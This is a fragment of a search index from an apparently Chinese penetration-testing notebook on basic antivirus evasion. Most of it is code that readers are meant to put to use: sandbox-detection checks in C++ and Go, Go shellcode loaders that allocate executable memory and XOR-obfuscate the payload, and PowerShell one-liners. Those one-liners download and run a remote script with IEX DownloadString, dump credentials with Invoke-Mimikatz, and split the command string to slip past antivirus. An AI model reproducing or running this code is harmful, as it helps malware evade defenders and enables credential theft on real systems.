(ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024; printf(\"cpu:%d,ram:%d,size(gb):%d\", numberOfProcessors, RAMMB, diskSizeGB);","title":"CPU,RAM\u7b49\u4fe1\u606f"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#mac","text":"\u5e38\u89c1\u865a\u62df\u673a\u5982vmware\uff0cviturl box\u7b49\u90fd\u6709\u7279\u6b8a\u7684mac\u5730\u5740\uff0c\u53ef\u4ee5\u4ee5\u6b64\u4e3a\u4f9d\u636e\u5224\u65ad\u662f\u5426\u5728\u865a\u62df\u673a\u4e2d\uff08\u968f\u7740\u865a\u62df\u5316\u4e3b\u673a\u8d8a\u6765\u8d8a\u666e\u904d\uff0c\u8bb8\u591a\u516c\u53f8\u5c06\u4e1a\u52a1\u7cfb\u7edf\u4e5f\u642c\u8fdb\u4e86\u865a\u62df\u673a\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u5df2\u4e0d\u592a\u80fd\u4f5c\u4e3a\u68c0\u6d4b\u6c99\u7bb1\u7684\u6307\u6807\uff09 \u201c\u901a\u5e38\uff0cMAC\u5730\u5740\u7684\u524d\u4e09\u4e2a\u5b57\u8282\u6807\u8bc6\u4e00\u4e2a\u63d0\u4f9b\u5546\u3002\u4ee500:05:69\u300100:0c:29\u548c00:50:56\u5f00\u59cb\u7684MAC\u5730\u5740\u4e0eVMware\u76f8\u5bf9\u5e94\uff1b\u4ee500:03:ff\u5f00\u59cb\u7684MAC\u5730\u5740\u4e0evirtualpc\u5bf9\u5e94\uff1b\u4ee508:00:27\u5f00\u59cb\u7684MAC\u5730\u5740\u4e0evirtualbox\u5bf9\u5e94\u3002\u201d string mac; get_3part_mac(mac); if (mac == \"00-05-69\" || mac == \"00-0c-29\" || mac == \"00-50-56\" || mac == \"00-03-ff\" || mac == \"08-00-27\") { } else { } void get_3part_mac(string &mac) { NCB Ncb; ASTAT Adapter; UCHAR uRetCode; LANA_ENUM lenum; memset(&Ncb, 0, sizeof(Ncb)); Ncb.ncb_command = NCBENUM; Ncb.ncb_buffer = (UCHAR *)&lenum; Ncb.ncb_length = sizeof(lenum); uRetCode = Netbios(&Ncb); for (int i = 0; i < lenum.length; i++) { memset(&Ncb, 0, sizeof(Ncb)); Ncb.ncb_command = NCBRESET; Ncb.ncb_lana_num = lenum.lana[i]; uRetCode = Netbios(&Ncb); memset(&Ncb, 0, sizeof(Ncb)); Ncb.ncb_command = NCBASTAT; Ncb.ncb_lana_num = lenum.lana[i]; strcpy((char *)Ncb.ncb_callname, \"*\"); Ncb.ncb_buffer = (unsigned char *)&Adapter; Ncb.ncb_length = sizeof(Adapter); uRetCode = Netbios(&Ncb); if (uRetCode == 0) { char tmp[128]; sprintf(tmp, \"%02x-%02x-%02x\", Adapter.adapt.adapter_address[0], Adapter.adapt.adapter_address[1], Adapter.adapt.adapter_address[2] ); mac = tmp; } } }","title":"mac"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#_12","text":"\u6c99\u7bb1\u7684\u5206\u8fa8\u7387\u90fd\u4e0d\u592a\u6b63\u5e38","title":"\u5206\u8fa8\u7387"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#_13","text":"\u6c99\u7bb1\u5f80\u5f80\u4f1a\u52a0\u901f\u8fd0\u884c\u6587\u4ef6\uff0c\u6545\u53ef\u4ee5\u68c0\u67e5\u65f6\u95f4\u6d41\u52a8\u6027\u662f\u5426\u6b63\u5e38\u4ece\u800c\u68c0\u6d4b\u6c99\u7bb1 //\u65f6\u533a DYNAMIC_TIME_ZONE_INFORMATION DynamicTimeZoneInfo; GetDynamicTimeZoneInformation(&DynamicTimeZoneInfo); wchar_t wcTimeZoneName[128 + 1]; StringCchCopyW(wcTimeZoneName, 128, DynamicTimeZoneInfo.TimeZoneKeyName); CharUpperW(wcTimeZoneName); if (!wcsstr(wcTimeZoneName, L\"CHINA STANDARD TIME\")) { } //\u6d41\u52a8\u6027 clock_t ClockStartTime, ClockEndTime; time_t UnixStartTime = time(0); ClockStartTime = clock(); Sleep(10000); ClockEndTime = clock(); time_t UnixEndTime = time(0); int iTimeDifference = ((UnixEndTime - UnixStartTime) * 1000) - (ClockEndTime - ClockStartTime); if (iTimeDifference>150){ //*code }","title":"\u68c0\u67e5\u65f6\u533a\u4e0e\u65f6\u95f4\u6d41\u52a8\u6027"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#_14","text":"wchar_t currentProcessPath[MAX_PATH + 1]; GetModuleFileNameW(NULL, currentProcessPath, MAX_PATH + 1); CharUpperW(currentProcessPath); if (!wcsstr(currentProcessPath, L\"evil.EXE\")) return false;","title":"\u68c0\u6d4b\u6587\u4ef6\u540d\u662f\u5426\u88ab\u6c99\u7bb1\u66f4\u6539"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#time-based-evasion","text":"\u57fa\u4e8e\u65f6\u95f4\u7684\u89c4\u907f\u3002\u5373\u6076\u610f\u8f6f\u4ef6\u5728\u76ee\u6807\u7cfb\u7edf\u4e0a\u8fd0\u884c\u540e\u5e76\u4e0d\u4f1a\u7acb\u523b\u8fdb\u884c\u6076\u610f\u884c\u52a8\uff0c\u800c\u662f\u4f1a\u4f2a\u88c5\u3001\u4f11\u7720\u4e00\u6bb5\u65f6\u95f4\uff0c\u7b49\u5230\u4e00\u5b9a\u65f6\u95f4\u540e\u518d\u5f00\u59cb\u6076\u610f\u884c\u52a8","title":"Time-Based Evasion"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#_15","text":"\u610f\u601d\u5c31\u662f\u8bf4\u8be5\u7a0b\u5e8f\u4f1a\u4e0d\u65ad\u5411\u67d0\u4e2a\u7f51\u5740\u53d1\u9001\u8bf7\u6c42\u5305\uff0c\u5982\u679c\u7f51\u5740\u8fd4\u56de\u4e86\u5bf9\u5e94\u7684\u542f\u52a8\u6307\u4ee4\u5219\u5f00\u59cb\u8c03\u7528\u6076\u610f\u4ee3\u7801\u3002 \u4e0b\u56fe\u662f\u7528HTTP\u8bf7\u6c42\u83b7\u53d6\u7f51\u9875\u5185\u5bb9\u7684\u4ee3\u7801\u3002 HINTERNET hSession = WinHttpOpen(L\"Mozilla 5.0\", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0); HINTERNET hConnection = WinHttpConnect(hSession, L\"www.baidu.com\", INTERNET_DEFAULT_HTTP_PORT, 0); HINTERNET hRequest = WinHttpOpenRequest(hConnection, L\"GET\", L\"\", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, NULL); WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0); WinHttpReceiveResponse(hRequest, 0); DWORD responseLength; WinHttpQueryDataAvailable(hRequest, &responseLength); PVOID response = new char[responseLength + 1]; WinHttpReadData(hRequest, response, responseLength, &responseLength); std::cout << ((char *)response);","title":"\u4f7f\u7528\u7f51\u7edc\u8fde\u63a5\u5b9e\u65f6\u8bfb\u53d6\u542f\u52a8\u6307\u4ee4"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#user-activity-based-checks","text":"\u901a\u8fc7\u68c0\u6d4b\u4e00\u4e9b\u884c\u4e3a\uff0c\u6765\u8bc6\u522b\u5f53\u524d\u5b9e\u65bd\u8005\u662f\u5426\u4e3a\u4eba\u7c7b\u3002\uff08\u6bd4\u5982\u52a8\u9f20\u6807\uff0c\u6572\u952e\u76d8\u7b49\uff0c\u6216\u8005\u67e5\u8be2\u7535\u8111\u4e0aword\u6587\u6863\u6253\u5f00\u5386\u53f2\u6570\uff0cchrome\u5386\u53f2\u8bb0\u5f55\u7b49\u4fe1\u606f\u6765\u5224\u65ad\uff09","title":"User Activity Based Checks"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#_16","text":"\u53ef\u4ee5\u8bbe\u7f6e\u9f20\u6807\u79fb\u52a8\u591a\u5c11\u8ddd\u79bb\u624d\u6267\u884cshellcode\uff0c\u6c99\u7bb1\u6709\u4e9b\u662f\u6ca1\u6709\u9f20\u6807\u7684\u3002 POINT CurrentMousePos; POINT PreviousMousePos; GetCursorPos(&PreviousMousePos); double Dis = 0; while (true) { GetCursorPos(&CurrentMousePos); Dis+= sqrt(pow(CurrentMousePos.x - PreviousMousePos.x, 2) + pow(CurrentMousePos.y - PreviousMousePos.y, 2)); Sleep(100); if (Dis > 20000) { //*code } }","title":"\u9f20\u6807\u79fb\u52a8\u8f68\u8ff9"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#_17","text":"\u5bf9\u4e8e\u4e00\u4e2a\u6b63\u5e38\u7684\u7528\u6237\u6765\u8bf4\uff0c\u542f\u52a8exe\u6587\u4ef6\u5e94\u8be5\u662f\u53cc\u51fb\u8fd0\u884c\uff0c\u7a0b\u5e8f\u542f\u52a8\u540e\u7236\u8fdb\u7a0b\u662fexplore.exe\uff0c\u5982\u679c\u662fcmd\u8fd0\u884c\u5219\u4f1a\u662fcmd.exe\u3001 \u4f46\u662f\u5bf9\u4e8e\u6c99\u7bb1\u5c31\u6709\u53ef\u80fd\u5b58\u5728\u7528\u4e00\u4e2a\u7a0b\u5e8f\u5982windbg\u6765\u542f\u52a8\u6211\u4eec\u7684\u6076\u610fEXE\u6587\u4ef6\uff0c\u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u5c31\u9700\u8981\u5bf9\u6b64\u70b9\u8fdb\u884c\u68c0\u6d4b\u3002 DWORD GetParentPID(DWORD pid) { DWORD ppid = 0; PROCESSENTRY32W processEntry = { 0 }; processEntry.dwSize = sizeof(PROCESSENTRY32W); HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //\u5bf9\u6240\u6709\u8fdb\u7a0b\u521b\u5efa\u5feb\u7167 if (Process32FirstW(hSnapshot, &processEntry)) //\u904d\u5386\u5feb\u7167\uff0c\u627e\u5230\u5f53\u524d\u4f20\u5165PID\u7684\u8fdb\u7a0b\u4fe1\u606f { do { if (processEntry.th32ProcessID == pid) { ppid = processEntry.th32ParentProcessID; //\u627e\u5230\u5e76\u8fd4\u56de\u4f20\u5165PID\u7684\u7236\u8fdb\u7a0bPID break; } } while (Process32NextW(hSnapshot, &processEntry)); } CloseHandle(hSnapshot); return ppid; } void main() { DWORD parentPid = GetParentPID(GetCurrentProcessId()); //\u83b7\u53d6\u5f53\u524d\u8fdb\u7a0b\u7236\u8fdb\u7a0bPID WCHAR parentName[MAX_PATH + 1]; DWORD dwParentName = MAX_PATH; HANDLE hParent = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, parentPid); //\u6253\u5f00\u7236\u8fdb\u7a0b QueryFullProcessImageNameW(hParent, 0, parentName, &dwParentName); // another way to get process name is to use 'Toolhelp32Snapshot' //\u83b7\u53d6\u8fdb\u7a0b\u540d CharUpperW(parentName); if (wcsstr(parentName, L\"WINDBG.EXE\")) return; //\u5339\u914d wprintf_s(L\"Now hacking...\\n\"); }","title":"\u68c0\u6d4b\u7236\u8fdb\u7a0b"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#_18","text":"","title":"\u8fdb\u7a0b\u9542\u7a7a"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#api","text":"typedef LPVOID(WINAPI* ImportVirtualAlloc)( LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect ); unsigned char buf[] = \"shellcode\"; ImportVirtualAlloc a = (ImportVirtualAlloc)GetProcAddress(GetModuleHandle(TEXT(\"kernel32.dll\")), \"VirtualAlloc\"); a(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);","title":"\u52a8\u6001\u8c03\u7528API"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#powershell","text":"","title":"Powershell"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#_19","text":"","title":"\u8fdc\u7a0b\u6267\u884c\u4e0e\u672c\u5730\u6267\u884c"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#_20","text":"powershell\u53ef\u4ee5\u52a0\u8f7d\u8fdc\u7a0b\u7684ps1\u6587\u4ef6\u3002\u8fd9\u6837\u505a\u7684\u597d\u5904\u662f\u5b9e\u73b0\u4e86\u65e0\u6587\u4ef6\u843d\u5730\u3002 powershell \"IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds\" \u4e0d\u8fc7\u5e02\u9762\u4e0a\u5f88\u591a\u6740\u8f6f\u5bf9downloadstring\u68c0\u6d4b\u5341\u5206\u5341\u5206\u4e25\u683c(\u8bb8\u591a\u4f1a\u68c0\u6d4b\u8fdc\u7a0b\u6587\u4ef6\u5b89\u5168\u6027\uff09 powershell -exec bypass -f \\\\webdavserver\\folder\\payload.ps1 (smb)","title":"\u8fdc\u7a0b\u6267\u884c"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#_21","text":"powershell Import-Module .\\xx.ps1","title":"\u672c\u5730\u6267\u884c"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#_22","text":"\u5c31\u50cf\u521a\u521a\u8fdc\u7a0b\u52a0\u8f7d\u7684downloadstring\u6cd5\uff0c\u5b83\u5f88\u5bb9\u6613\u88ab\u6740\u8f6f\u62e6\u622a\u3002\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u62c6\u5206\u91cd\u7ec4\u7ed5\u8fc7\u4e00\u4e9b\u6740\u8f6f\u68c0\u6d4b\u3002 powershell -c \"$c1='IEX(New-Object Net.WebClient).Downlo';$c2='123(''http://webserver/xxx.ps1'')'.Replace('123','adString');IEX ($c1+$c2)\"","title":"\u547d\u4ee4\u62c6\u5206"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#go","text":"","title":"GO"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#funny","text":"\u5f88\u6709\u8da3\u7684\u4e00\u4ef6\u4e8b\u662f\uff0c\u7528go\u8bed\u8a00\u5199\u4e2ahelloworld\u4f20\u5230vt\u88ab14\u5bb6\u6740,\u725b\u6279","title":"FUNNY"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#exe_2","text":"go \u7f16\u8bd1\u4e3aEXE \u7684\u505a\u6cd5\u662f go build ....go\uff0c\u4f46\u8fd9\u6837EXE\u6253\u5f00\u65f6\u4f1a\u6709\u4e2a\u9ed1\u6846 go build -ldflags \"-H windowsgui\" ..go \u751f\u6210\u65e0\u7a97\u53e3EXE\uff0c\u4f46\u8fd9\u6837\u4f1a\u589e\u52a0\u6740\u8f6f\u7684\u67e5\u6740\u5ea6","title":"\u751f\u6210EXE"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#shellcode_9","text":"package main import ( \"syscall\" \"unsafe\" ) const ( MEM_COMMIT = 0x1000 MEM_RESERVE = 0x2000 PAGE_EXECUTE_READWRITE = 0x40 // \u533a\u57df\u53ef\u4ee5\u6267\u884c\u4ee3\u7801\uff0c\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u8bfb\u5199\u8be5\u533a\u57df\u3002 KEY_1 = 55 KEY_2 = 66 ) var ( kernel32 = syscall.MustLoadDLL(\"kernel32.dll\") ntdll = syscall.MustLoadDLL(\"ntdll.dll\") VirtualAlloc = kernel32.MustFindProc(\"VirtualAlloc\") RtlCopyMemory = ntdll.MustFindProc(\"RtlCopyMemory\") ) func main(){ shellcode:=[]byte{0xfc,...,0x30,0x00,0x19,0x69,0xa0,0x8d} addr,_,err:=VirtualAlloc.Call(0,uintptr(len(shellcode)),MEM_COMMIT, PAGE_EXECUTE_READWRITE ) if err != nil && err.Error() != \"The operation completed successfully.\" { syscall.Exit(0) } _, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode))) if err != nil && err.Error() != \"The operation completed successfully.\" { syscall.Exit(0) } syscall.Syscall(addr, 0, 0, 0, 0) } \u6700\u539f\u59cb\u7248\u672c,\u88ab\u6740\u6210\u54c8\u6279\uff0c\u4f46\u5373\u4f7f\u8fd9\u6837360\u4e5f\u6740\u4e0d\u51fa\u6765\uff0c\u53ef\u4ee5\u770b\u51fa\u7ed5\u8fc7360\u6709\u624b\u5c31\u884c","title":"\u7533\u8bf7\u5185\u5b58\u52a0\u8f7dshellcode"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#xor","text":"xor\u6a21\u5757\uff08\u83b7\u5f97xor\u540e\u7684shellcode\uff09 for i:=0;i<len(shellcode);i++{ fmt.Print(\"0x\",strconv.FormatInt(int64(shellcode[i]^123),16),\",\") } xor_shellcode:=[]byte{xored_shellcode} var shellcode []byte for i:=0;i<len(xor_shellcode);i++{ shellcode=append(shellcode,xor_shellcode[i]^123) } addr,_,err:=VirtualAlloc.Call(0,uintptr(len(shellcode)),MEM_COMMIT, PAGE_EXECUTE_READWRITE ) if err != nil && err.Error() != \"The operation completed successfully.\" { syscall.Exit(0) } _, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode))) if err != nil && err.Error() != \"The operation completed successfully.\" { syscall.Exit(0) } syscall.Syscall(addr, 0, 0, 0, 0) \u597d\u4e86\u70b9\uff0c\u4f46\u662f\u5982\u679c\u52a0\u4e0a\u65e0\u6846\u542f\u52a8\uff0c\u8fd8\u662f\u4f1a\u88ab\u6740\u6210\u54c8\u6279","title":"\u7b80\u5355XOR"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#_23","text":"imoprt{ \"github.com/shirou/gopsutil/host\" \"github.com/shirou/gopsutil/mem\" \"github.com/shirou/gopsutil/disk\" } func CheckTime() bool{ timeBoot, _ := host.BootTime() t := time.Unix(int64(timeBoot), 0) timeNow:=time.Now() ts:=timeNow.Sub(t) if ts.Minutes()<12{ return false }else{ return true } } func CheckName() bool{ files, _ := ioutil.ReadDir(\"./\") for _, f := range files { if f.Name()==\"ActiveX.exe\"{ return true } } return false } func CheckSystem() bool{ info1,_:=mem.SwapMemory() info2,_:=mem.VirtualMemory() disk,_:=disk.Usage(\"c:\") if(runtime.NumCPU()<2&&info1.Total<2147483648&&info2.Total<2147483648&&disk.Total<21474836480){ return false } return true } 